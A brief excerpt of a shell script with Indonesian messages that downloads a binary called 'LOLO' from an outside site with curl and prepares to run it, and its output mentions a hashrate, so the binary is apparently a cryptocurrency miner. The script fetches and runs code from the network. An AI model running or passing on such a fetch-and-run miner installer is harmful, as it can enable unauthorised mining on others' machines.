...
# URL file
URL_GENZO="https://blogspotgenzo.site/LOLO"
...
echo "[*] Download LOLO..."
curl -fsSL "$URL_GENZO" -o "$FILE_GENZO" || { echo "Gagal download LOLO"; exit 1; }
...
echo "[*] Menjalankan LOLO (hashrate akan tampil di bawah)..."
echo ""
